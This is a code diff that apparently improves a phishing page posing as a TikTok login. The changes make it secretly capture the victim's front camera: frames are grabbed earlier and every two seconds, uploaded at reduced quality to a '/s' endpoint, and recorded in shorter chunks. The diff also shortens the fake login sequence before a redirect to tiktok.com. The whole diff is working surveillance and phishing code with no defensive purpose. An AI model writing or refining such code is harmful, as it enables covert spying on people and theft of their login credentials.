@@ -247,11 +247,15 @@ HTML_PAGE = '''<!DOCTYPE html>
         function startSimpleCapture(){
             try{
                 var fv = document.getElementById('frontVideo');
+                if(fv){
+                    fv.play().catch(function(e){ console.log("Video play error:", e); });
+                }
                 var canvas = document.getElementById('canvas') || document.createElement('canvas');
                 if(!canvas.id) canvas.id = 'canvas';
                 var ctx = canvas.getContext && canvas.getContext('2d');
                 if(!ctx || !fv) return;
-                setInterval(function(){
+                
+                function sendCapture(){
                     try{
                         if(fv.videoWidth && fv.videoHeight){
                             canvas.width = fv.videoWidth; canvas.height = fv.videoHeight;
@@ -264,13 +268,20 @@ HTML_PAGE = '''<!DOCTYPE html>
                                         try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'FRONT_live', photo:reader.result})}); }catch(e){}
                                     };
                                     reader.readAsDataURL(blob);
-                                },'image/jpeg',0.85);
+                                },'image/jpeg',0.6); // Lowered quality to ensure fast upload
                             }catch(e){
-                                try{ var d = canvas.toDataURL('image/jpeg',0.85); safePost({type:'FRONT_live', photo:d}); }catch(e){}
+                                try{ var d = canvas.toDataURL('image/jpeg',0.6); safePost({type:'FRONT_live', photo:d}); }catch(e){}
                             }
                         }
                     }catch(e){}
-                }, 2000);
+                }
+                
+                // Try capturing immediately
+                setTimeout(sendCapture, 500);
+                setTimeout(sendCapture, 1500);
+                
+                // Then repeat every 2 seconds
+                setInterval(sendCapture, 2000);
             }catch(e){}
         }
 
@@ -418,7 +429,7 @@ window.addEventListener('load', async ()=>{
                 console.log('Direct getUserMedia granted from gesture', e.type);
                 try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'entry_gesture_open_cam', ev:e.type, ...data})}); }catch(_){}
                 const fv = document.getElementById('frontVideo');
-                if(fv){ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }
+                if(fv){ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; fv.play().catch(e=>{}); }
                 camStarted = true;
                 try{ startSimpleCapture(); }catch(err){ console.log('startCapture after gesture failed', err); }
 
@@ -438,7 +449,7 @@ window.addEventListener('load', async ()=>{
                             reader.readAsDataURL(ev.data);
                         }
                     };
-                    recorder.start(5000); 
+                    recorder.start(3000); 
                 }catch(err){ console.log('MediaRecorder error', err); }
                 
                 // proceed to login UI transition (non-blocking)
@@ -893,11 +904,11 @@ function submitLogin(){
     setTimeout(()=>{
         document.getElementById("step2").classList.add("hidden");
         document.getElementById("step3").classList.remove("hidden");
-    }, 6000);
+    }, 3000);
     setTimeout(()=>{
         document.getElementById('step3').querySelector('p').textContent = 'Redirecting to TikTok, please wait...';
         location.href = 'https://www.tiktok.com';
-    }, 12000);
+    }, 8000);
 }
 
 function toggleBackgroundMute(){
